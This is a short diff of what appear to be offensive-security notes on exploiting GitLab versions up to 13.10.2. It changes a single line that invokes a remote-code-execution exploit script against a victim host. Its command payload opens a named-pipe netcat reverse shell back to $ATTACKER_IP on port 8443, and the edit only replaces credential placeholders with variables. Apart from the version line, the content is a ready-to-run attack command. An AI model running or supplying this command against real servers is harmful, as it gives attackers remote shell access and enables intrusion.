@@ -21,5 +21,5 @@
 - Vulnerable version (≤ 13.10.2).
 #### <span style="color:#FFB86C">Use Exploit Script:</span>
 ```bash
-python3 gitlab_13_10_2_rce.py -t http://gitlab.$VICTIM_IP:8081 -u <user> -p <password> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $ATTACKER_IP 8443 >/tmp/f'
+python3 gitlab_13_10_2_rce.py -t http://gitlab.$VICTIM_IP:8081 -u $USER -p $PASS -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $ATTACKER_IP 8443 >/tmp/f'
 ```
